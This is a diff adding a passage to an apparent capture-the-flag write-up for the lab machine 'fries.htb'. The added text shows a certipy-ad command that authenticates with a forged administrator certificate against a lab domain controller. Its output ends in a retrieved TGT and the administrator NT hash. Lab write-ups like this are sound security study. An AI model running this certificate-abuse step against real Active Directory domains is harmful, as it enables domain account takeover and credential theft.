@@ -1282,8 +1282,34 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Now ill use thiis certificate to extract the NTLM
 
 ```python
+faketime -f +7h certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.244.72 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '10.129.244.72'
+[+] DC IP: '10.129.244.72'
+[+] DC Host: ''
+[+] Target IP: '10.129.244.72'
+[+] Remote Name: '10.129.244.72'
+[+] Domain: ''
+[+] Username: ''
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@fries.htb'
+[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
+[+] Found SID in SAN URL: 'S-1-5-21-858338346-3861030516-3975240472-500'
+[*] Using principal: 'administrator@fries.htb'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC fries.htb (10.129.244.72)
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[+] Attempting to write data to 'administrator.ccache'
+[+] Data written to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
 ```
+
+
 
 
 
